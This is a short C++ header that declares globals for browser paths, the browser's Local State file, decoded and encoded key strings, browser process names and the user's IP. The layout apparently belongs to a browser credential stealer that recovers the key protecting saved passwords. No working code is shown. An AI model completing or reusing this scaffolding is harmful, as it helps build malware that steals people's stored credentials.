#pragma once
#include "../includes.h"

std::string get_ip();
std::string read_file_utf8(const std::string& file_path);

namespace definitions {

    extern std::string ip;
    extern std::string home;
    extern std::string username;
    extern std::string browser;
    extern std::string localstate_path;
    extern std::string localstate_content;
    extern bool blank_password;
    extern std::string decoded_key_str;
    extern std::string encoded_key_str;
    extern std::vector<std::string> browser_proccess;
    extern std::map<std::string, std::string> browser_paths;

    void initialize();  // Initialize the variables
}